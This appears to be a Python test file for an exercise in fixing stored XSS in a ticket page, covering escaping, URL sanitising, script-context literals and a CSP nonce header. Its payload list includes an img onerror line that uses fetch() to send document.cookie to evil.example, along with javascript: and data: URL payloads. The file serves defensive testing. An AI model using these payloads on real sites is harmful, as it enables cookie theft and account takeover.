import unittest
from html.parser import HTMLParser

from solution import (SafeHTML, Template, csp_header, js_literal, naive_ticket_row,
                      new_nonce, render_ticket_page, sanitize_url, TICKET_ROW)


class Dom(HTMLParser):
    """Collect what a browser would build: tags, attributes, script bodies."""

    def __init__(self, html):
        super().__init__(convert_charrefs=True)
        self.tags, self.attrs, self.scripts, self._in_script = [], [], [], False
        self.feed(html)

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs.extend((tag, k, v) for k, v in attrs)
        self._in_script = tag == "script"

    def handle_endtag(self, tag):
        if tag == "script":
            self._in_script = False

    def handle_data(self, data):
        if self._in_script:
            self.scripts.append(data)


PAYLOADS = [
    '<img src=x onerror="fetch(\'//evil.example/\'+document.cookie)">',
    '"><script>alert(1)</script>',
    "' onmouseover='alert(1)",
    "<svg/onload=alert(1)>",
    "</script><script>alert(1)</script>",
]
BAD_URLS = ["javascript:alert(1)", "JaVaScRiPt:alert(1)", " javascript:alert(1)",
            "java\tscript:alert(1)", "java\nscript:alert(1)", "\x01javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD4=", "vbscript:msgbox", "//evil.example/x",
            "\\\\evil.example"]


def ticket(name="Asha", subject="Refund", website="https://asha.example.com"):
    return {"ticket_id": 42, "display_name": name, "subject": subject, "website": website}


def event_handler_attrs(dom):
    return [a for a in dom.attrs if a[1].startswith("on")]


class ReproduceStoredXss(unittest.TestCase):
    def test_display_name_injects_tag_with_handler(self):
        dom = Dom(naive_ticket_row(ticket(name=PAYLOADS[0])))
        self.assertIn("img", dom.tags)
        self.assertTrue(event_handler_attrs(dom))

    def test_subject_breaks_out_of_attribute(self):
        dom = Dom(naive_ticket_row(ticket(subject=PAYLOADS[1])))
        self.assertIn("script", dom.tags)

    def test_javascript_url_kept(self):
        dom = Dom(naive_ticket_row(ticket(website=BAD_URLS[0])))
        self.assertIn(("a", "href", "javascript:alert(1)"), dom.attrs)


class Escaping(unittest.TestCase):
    def test_no_payload_creates_elements_or_handlers(self):
        for p in PAYLOADS:
            for field in ("name", "subject"):
                dom = Dom(TICKET_ROW.render(**ticket(**{field: p})))
                self.assertEqual(dom.tags, ["tr", "td", "td", "td", "a"], (field, p))
                self.assertEqual(event_handler_attrs(dom), [], p)

    def test_text_round_trips_exactly(self):
        for p in PAYLOADS:
            dom = Dom(TICKET_ROW.render(**ticket(subject=p)))
            self.assertIn(("td", "title", p), dom.attrs)   # shown as text, not code

    def test_dangerous_urls_neutralised(self):
        for u in BAD_URLS:
            self.assertEqual(sanitize_url(u), "#", repr(u))
            dom = Dom(TICKET_ROW.render(**ticket(website=u)))
            self.assertIn(("a", "href", "#"), dom.attrs)

    def test_good_urls_kept(self):
        for u in ["https://asha.example.com/a?b=1&c=2", "http://x.example", "mailto:a@example.com",
                  "/help/article", "relative/page", "#top"]:
            self.assertEqual(sanitize_url(u), u)
        dom = Dom(TICKET_ROW.render(**ticket(website="https://x.example/?a=1&b=2")))
        self.assertIn(("a", "href", "https://x.example/?a=1&b=2"), dom.attrs)
        self.assertEqual(sanitize_url(""), "#")

    def test_script_context_cannot_close_tag(self):
        nonce = new_nonce()
        page = render_ticket_page(ticket(name=PAYLOADS[4], subject="\u2028x"), nonce)
        dom = Dom(page)
        self.assertEqual(dom.tags.count("script"), 1)
        self.assertEqual(len(dom.scripts), 1)
        self.assertIn(("script", "nonce", nonce), dom.attrs)
        self.assertNotIn("</script><script>", dom.scripts[0])

    def test_js_literal_is_valid_json(self):
        import json
        value = {"n": "</script>&<!--", "u": "\u2028"}
        self.assertEqual(json.loads(js_literal(value)), value)
        self.assertNotIn("<", js_literal(value))


class TemplateRules(unittest.TestCase):
    def test_safe_requires_safehtml(self):
        t = Template("<div>{{ body|safe }}</div>")
        with self.assertRaises(TypeError):
            t.render(body="<b>hi</b>")
        self.assertEqual(t.render(body=SafeHTML("<b>hi</b>")), "<div><b>hi</b></div>")

    def test_unknown_filter_and_missing_value(self):
        with self.assertRaises(ValueError):
            Template("{{ x|raw }}")
        with self.assertRaises(KeyError):
            Template("{{ x }}").render()

    def test_csp_has_nonce_and_no_unsafe_inline(self):
        n = new_nonce()
        header = csp_header(n)
        self.assertIn(f"'nonce-{n}'", header)
        self.assertNotIn("unsafe-inline", header)
        self.assertIn("object-src 'none'", header)
        self.assertNotEqual(new_nonce(), new_nonce())


if __name__ == "__main__":
    unittest.main()
